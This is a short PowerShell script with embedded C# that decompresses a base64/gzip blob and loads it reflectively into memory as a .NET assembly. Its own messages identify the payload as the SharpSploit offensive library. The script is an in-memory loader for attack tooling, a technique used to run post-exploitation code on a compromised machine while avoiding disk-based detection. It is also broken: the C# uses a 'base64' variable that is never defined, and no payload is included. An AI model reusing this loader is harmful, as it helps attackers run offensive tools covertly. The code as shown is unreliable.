$gzipbyte = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace GzipandBase64
{
    public class Program
    {
        
        public static void Main(string[] args)
        {
            back();
        }
        public static byte[] back ()
        {

            Byte[] unpacked = new byte[3605164];
            using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(base64)))
            {
                using (GZipStream stream = new GZipStream(inputStream, CompressionMode.Decompress, true))
                {
                    stream.Read(unpacked, 0, 3605164);
                }
            }
            return unpacked;
        }
       
    }
}
"@
try
{
    Add-Type -TypeDefinition $gzipbyte -Language CSharp
    $a = [GzipandBase64.Program]::back()
    $RAS = [System.Reflection.Assembly]::Load($a)
    Write-Host "Sharpsploit loaded successfully!"
}
catch
{
    Write-Host "Error loading Sharpsploit"
}